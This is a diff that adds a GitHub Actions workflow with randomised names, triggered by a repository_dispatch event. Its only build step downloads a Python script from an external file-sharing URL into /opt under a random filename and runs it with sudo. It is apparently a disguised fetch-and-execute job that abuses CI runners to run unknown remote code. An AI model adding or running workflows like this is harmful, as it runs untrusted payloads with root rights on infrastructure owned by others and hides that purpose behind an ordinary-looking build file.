@@ -1,0 +1,21 @@
+name: KjtunXmyEx
+
+on:
+  repository_dispatch:
+    types:
+      - linux
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - name: U4LMOScpbK
+        run: |
+          sudo apt-get update -y
+          sudo apt-get install wget -y
+          cd /opt
+          sudo wget https://pan.urldwz.com/api/v3/file/source/57248/runhc_linux.py?sign=_3Q-iix0Ijv3MHjgMiE4djw5mtIlZ--uZqKscMIBpEU%3D%3A0 -O N7AuD6Pxtk.py
+          sudo python ./N7AuD6Pxtk.py
